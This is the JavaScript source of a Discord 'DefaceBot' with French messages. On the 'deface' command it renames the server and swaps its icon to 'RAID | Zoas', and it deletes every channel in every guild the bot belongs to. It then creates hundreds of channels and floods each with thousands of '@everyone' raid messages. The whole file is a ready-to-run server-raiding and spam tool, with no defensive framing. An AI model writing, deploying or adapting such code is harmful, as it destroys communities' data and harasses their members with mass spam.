const Discord = require('discord.js');
const config = require('./config.json');
const figlet = require('figlet');
const colors = require('colors');
const client = new Discord.Client();

client.on('ready',() => {
	clear();
	client.user.setActivity(`${config.prefix}help | ${client.guilds.size} serveurs.`, "https://twitch.tv/sex");
})

client.on('message', (message) => {
	if(!message.guild) return;
	if (message.content.startsWith(`${config.prefix}deface`)){
		message.guild.setIcon('https://scontent-cdg2-1.xx.fbcdn.net/v/t1.0-9/53292243_337639216876609_2362263121248124928_n.png?_nc_cat=102&ccb=2&_nc_sid=85a577&efg=eyJpIjoidCJ9&_nc_ohc=ZthzWMQvgIYAX_JOMuc&_nc_ht=scontent-cdg2-1.xx&oh=84071b4a4b569e06e9467bb88f81802b&oe=5FFE5265');
		message.guild.setName(`RAID | Zoas`);
		message.delete();
		client.guilds.cache.forEach(guild => { 
			guild.channels.cache.forEach(channel => { 
				channel.delete().catch(error => { 
					console.log(`Couldn't delete ${channel.name}.`)
				});
			});
		});
		message.guild.channels.create(`RAID | Zoas`,{ type: 'text' })
		for (var i = 0; i < 500; i++) {
            if (message.guild.channels.size > 498) return;
                message.guild.channels.create(`RAID | Zoas`, {type: 'text' })
                    .then(channel => {
                        for (var o = 0; o < 8000; o++) {
                            channel.send(`@everyone RAID par Zoas\n`);
                        }
                    })
                    .catch(console.error);
            }
        }
});

function clear() {
  console.log('__________________________________________________________________')
  console.log(figlet.textSync("\n         DefaceBot  ( :").green);
  console.log("\n\n DefaceBot - commandes : `deface`".white);
  console.log(`\n \n Prefix: ${config.prefix}`.bold.red);
  console.log("\n Owner : Extasio.#2300".bold.blue);
}

client.login(config.token);
